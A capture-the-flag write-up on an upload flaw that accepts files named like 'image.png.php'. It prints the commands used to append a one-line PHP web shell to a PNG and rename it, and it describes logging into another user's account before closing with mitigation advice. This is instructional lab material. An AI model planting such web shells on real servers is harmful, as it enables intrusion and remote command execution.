@@ -1,0 +1,69 @@
+Challenge: Agent RFI
+Atish Kadam
+
+
+VULNERABILITY
+
+The site had a Remote File Inclusion (RFI) vulnerability combined with a flawed
+file upload mechanism. The server was only checking if the filename ended with
+".png" but wasn't validating anything beyond that — meaning you could upload a
+PHP file disguised as an image just by naming it something like "image.png.php".
+The actual file content was never checked either, so malicious PHP code could
+be uploaded and executed on the server.
+
+
+APPROACH / SOLUTION
+
+The only place on the site where file uploads were possible was the profile
+picture (avatar) section in user settings, so that's where I focused.
+
+Step 1 - Testing what the server accepts:
+I first tried uploading a plain PHP file. The server rejected it — it only
+accepted PNG files. So I needed to find a way around that check.
+
+Step 2 - Bypassing the file type check:
+I renamed the file to "image.png.php" and uploaded it without changing anything
+inside. It went through. This told me the server was only looking at the ".png"
+part of the filename and not checking what came after it — or what was actually
+inside the file.
+
+Step 3 - Injecting PHP code into the image file:
+Instead of creating a separate PHP file, I appended malicious PHP code directly
+into a legitimate PNG file using the following command:
+
+  echo '<?php system($_GET["cmd"]); ?>' >> image.png
+
+This added a PHP web shell at the end of the image. I then renamed the file to
+trick the server into treating it as a PHP file:
+
+  mv image.png image.png.php
+
+Then uploaded it to the profile picture section. The server accepted it because
+the filename contained ".png".
+
+Step 4 - Getting the result:
+After uploading, the server executed the PHP code
+
+Step 5 - Finding the flag:
+I then searched for a user with the name "RFI" on the platform and found them.
+Using their email, I logged into their account and found the flag in their bio.
+
+
+MITIGATION / FIX
+
+The core problem is that the server trusted the filename without properly
+verifying what the file actually was. Here's how to fix it:
+
+1. Validate file content, not just the name — check the actual file type using
+   magic bytes or a proper library, not just what the filename says. A PHP file
+   renamed to ".png" should be detected and rejected.
+
+2. Strict extension checking — only allow a single, clean extension. A filename
+   like "image.png.php" should immediately be flagged and rejected.
+
+3. Never execute uploaded files — uploaded files should be stored in a location
+   where the server cannot execute them, and they should never be treated as
+   scripts under any circumstances.
+
+4. Rename uploaded files — strip the original filename entirely and assign a
+   random, safe name with the correct extension when saving to the server.
